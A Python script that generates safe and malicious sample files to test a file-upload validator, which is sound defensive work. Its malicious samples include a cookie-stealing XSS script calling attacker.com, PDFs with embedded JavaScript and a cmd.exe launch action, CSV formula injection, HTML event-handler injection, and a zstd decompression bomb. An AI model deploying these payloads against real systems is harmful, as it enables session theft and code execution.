import os
import shutil
import zstandard as zstd

def create_test_files():
    # Clean up old test suite
    if os.path.exists("test_suite"):
        shutil.rmtree("test_suite")
        
    os.makedirs("test_suite/safe", exist_ok=True)
    os.makedirs("test_suite/malicious", exist_ok=True)
    
    # ==========================
    # 🟢 SAFE FILES (Should Pass)
    # ==========================
    
    # 1. Safe CSV
    with open("test_suite/safe/data_1.csv", "w", encoding='utf-8') as f:
        f.write("id,name,value\n1,Alice,100\n2,Bob,200\n3,Eve,300")
        
    # 2. Safe JSON
    with open("test_suite/safe/data_2.json", "w", encoding='utf-8') as f:
        f.write('{ "status": "success", "results": [1, 2, 3] }')

    # 3. Safe JSONL
    with open("test_suite/safe/data_3.jsonl", "w", encoding='utf-8') as f:
        f.write('{"id": 1, "name": "foo"}\n{"id": 2, "name": "bar"}')
        
    # 4. Safe Text/Markdown
    with open("test_suite/safe/document_4.md", "w", encoding='utf-8') as f:
        f.write("# Safe Document\nThis is a standard markdown file with **no** executable scripts.")

    # 5. Safe ZST (Small compressible data)
    data = b"Hello, this is a safe zst file! " * 100
    cctx = zstd.ZstdCompressor()
    with open("test_suite/safe/archive_5.zst", "wb") as f:
        f.write(cctx.compress(data))

    # 6. Safe PDF (Minimal valid PDF without macros/JS)
    with open("test_suite/safe/document_6.pdf", "wb") as f:
        # Minimal valid PDF signature and structure
        f.write(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF")

    # ==========================
    # 🔴 MALICIOUS FILES (Should Fail)
    # ==========================

    # 1. IDENTITY SPOOFING (Fail: Magic) -> ELF binary disguised as CSV
    with open("test_suite/malicious/spoofed_identity.csv", "wb") as f:
        f.write(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00") 

    # 2. MALWARE / VIRUS SIGNATURE (Fail: ClamAV) -> EICAR standard test
    with open("test_suite/malicious/virus_eicar.txt", "w", encoding='utf-8') as f:
        f.write("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    # 3. MALICIOUS PDF SCRIPT (Fail: pdfid)
    with open("test_suite/malicious/script_payload.pdf", "w", encoding='utf-8') as f:
        f.write("%PDF-1.4\n1 0 obj\n<< /JS (app.alert('Hacked');) /JavaScript << /S /JavaScript >> >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF")

    # 4. MALICIOUS PDF AUTO-LAUNCH (Fail: pdfid)
    with open("test_suite/malicious/auto_launch.pdf", "w", encoding='utf-8') as f:
        f.write("%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (cmd.exe) /OpenAction 1 0 R >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF")

    # 5. XSS PAYLOAD (Fail: Bleach) -> Markdown with script tags
    with open("test_suite/malicious/xss_markdown.md", "w", encoding='utf-8') as f:
        f.write("# Dashboard\n<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>")

    # 6. HTML INJECTION (Fail: Bleach) -> Tries to embed iframe or onload executable
    with open("test_suite/malicious/phishing.txt", "w", encoding='utf-8') as f:
        f.write("Welcome!<img src='x' onerror='alert(\"XSS\")'> Click <a href='javascript:alert(1)'>here</a>.")

    # 7. CSV FORMULA INJECTION (Fail: Data/Frictionless)
    with open("test_suite/malicious/csv_injection.csv", "w", encoding='utf-8') as f:
        f.write("id,first_name,last_name\n1,John,=cmd|' /C calc'!A0\n2,Jane,+SUM(1+1)\n3,Bad,-2+2\n4,Worse,@SUM(1)")

    # 8. BROKEN JSON / DATA POISONING (Fail: Data)
    with open("test_suite/malicious/broken_structure.json", "w", encoding='utf-8') as f:
        f.write("{ \"name\": \"missing_bracket\", \"data\": [1, 2, 3 ")

    # 9. ZSTAND DECOMPRESSION BOMB (Fail: Zstd Ratio) -> Huge uncompressed size
    data = b"\x00" * (15 * 1024 * 1024) # 15 MB of zeros
    cctx = zstd.ZstdCompressor()
    with open("test_suite/malicious/bomb.zst", "wb") as f:
        f.write(cctx.compress(data))
        
    print("✅ Comprehensive Test Suite generated in 'test_suite/safe/' and 'test_suite/malicious/'.")

if __name__ == "__main__":
    create_test_files()
